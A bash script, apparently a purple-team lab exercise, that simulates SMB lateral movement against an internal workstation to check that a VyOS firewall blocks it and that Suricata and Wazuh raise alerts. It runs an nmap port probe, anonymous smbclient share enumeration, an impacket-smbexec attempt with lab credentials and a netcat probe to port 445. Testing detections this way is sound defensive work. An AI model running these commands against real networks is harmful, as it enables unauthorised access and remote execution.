#!/bin/bash
# Attack Simulation 02 — SMB Lateral Movement
# MITRE ATT&CK: T1021.002 — Remote Services: SMB/Windows Admin Shares
# Attacker: Kali (10.10.10.20) in DMZ
# Target:   Workstation (10.10.20.10) in Internal zone
# Expected VyOS action:  BLOCK — DMZ→Internal allows HTTP only; port 445 dropped
# Expected Suricata SID: 9001001 (SMB enum from DMZ), 9001002 (NetBIOS from DMZ)
# Expected Wazuh alert:  rule group "suricata" — policy-violation classtype

set -euo pipefail

TARGET="10.10.20.10"
LOG_DIR="/tmp/attack-logs"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================================"
echo "  ATTACK 02 — SMB Lateral Movement (T1021.002)"
echo "  Attacker: $(hostname) | Target: $TARGET"
echo "  Time: $(date)"
echo "============================================================"

# Phase 1: SMB port probe (should be blocked by VyOS)
echo "[+] Phase 1: Probe SMB ports (expect BLOCKED by VyOS)"
nmap -p 139,445 --open "$TARGET" \
     -oN "$LOG_DIR/02a-smb-probe-$TIMESTAMP.txt" 2>&1
echo "[*] If ports shown as 'filtered' — VyOS blocked correctly"

sleep 2

# Phase 2: Attempt SMB enumeration with smbclient
echo "[+] Phase 2: SMB share enumeration attempt"
timeout 10 smbclient -L "//$TARGET" -N \
    2>&1 | tee "$LOG_DIR/02b-smb-enum-$TIMESTAMP.txt" || \
    echo "[BLOCKED] Connection timed out — VyOS firewall working"

sleep 2

# Phase 3: Impacket SMBExec attempt (generates T1021.002 Suricata signature)
echo "[+] Phase 3: Impacket SMBExec attempt (expect blocked)"
if command -v impacket-smbexec &>/dev/null; then
    timeout 15 impacket-smbexec \
        "labuser:labpassword@$TARGET" \
        -dc-ip "$TARGET" \
        2>&1 | tee "$LOG_DIR/02c-smbexec-$TIMESTAMP.txt" || \
        echo "[BLOCKED/TIMEOUT] SMBExec timed out"
else
    echo "[INFO] impacket-smbexec not installed — run: apt install python3-impacket"
    # Still generates traffic for Suricata detection via raw SMB probe
    echo -n "" | nc -w3 "$TARGET" 445 2>&1 | \
        tee "$LOG_DIR/02c-smb-nc-$TIMESTAMP.txt" || \
        echo "[BLOCKED] NC to port 445 failed — VyOS firewall working"
fi

echo ""
echo "[RESULTS] Output saved to $LOG_DIR/"
echo "[EXPECTED DETECTIONS]"
echo "  VyOS:     dropped on DMZ-TO-INTERNAL rule — port 445 not in allow-list"
echo "  Suricata SID 9001001 — SMB enum from DMZ T1021.002 (if traffic reaches bridge)"
echo "  Suricata SID 9001014 — Impacket PSEXESVC signature"
echo "  EVE JSON event_type: alert, classtype: policy-violation"
echo "  Wazuh dashboard: Security Alerts > policy-violation"
echo "============================================================"
